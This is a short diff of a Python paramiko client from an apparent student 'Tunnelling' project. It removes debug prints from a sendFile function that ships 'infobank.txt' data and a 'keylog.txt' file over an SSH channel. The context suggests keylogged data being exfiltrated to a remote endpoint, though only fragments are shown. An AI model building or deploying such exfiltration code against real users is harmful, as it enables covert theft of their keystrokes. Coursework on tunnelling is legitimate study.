@@ -1,5 +1,5 @@
-# test_client.py
-
+#!/usr/bin/env/python3
+# paramiko_client.py
 #==============================================================================
  #   Assignment:  Major Project - Tunelling Milestone 1
  #
@@ -171,7 +171,6 @@ def sendFile(dataFile,  keyLoc, filename):
     '''
     chan = connect(keyLoc) #connect
     if filename == 'infobank.txt':
-        print(filename)
         #send this filename
         strn = filename
         
@@ -183,7 +182,6 @@ def sendFile(dataFile,  keyLoc, filename):
             for values in indexes:
                 str += values + ","
             str += "|"
-        print(str)
         chan.sendall(str.encode('utf-8'))
     
     elif filename == 'keylog.txt':
